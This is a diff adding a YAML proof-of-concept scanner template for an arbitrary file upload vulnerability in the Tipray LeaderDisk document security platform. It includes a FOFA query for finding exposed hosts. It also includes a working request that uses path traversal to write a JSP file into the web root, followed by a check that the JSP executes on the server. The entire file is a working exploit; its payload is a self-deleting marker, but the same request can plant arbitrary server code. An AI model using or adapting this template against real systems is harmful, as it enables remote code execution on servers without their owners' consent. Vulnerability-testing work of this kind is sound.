@@ -1,0 +1,32 @@
+id: poc-yaml-tipray-dsmp-uploadfolder-anyfile-upload
+info:
+  name: 天锐绿盘文档安全管理平台 uploadFolder.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 天锐绿盘文档安全管理平台
+  fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(headers,"/lddsm")
+    && contains(content_type,"application/json")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
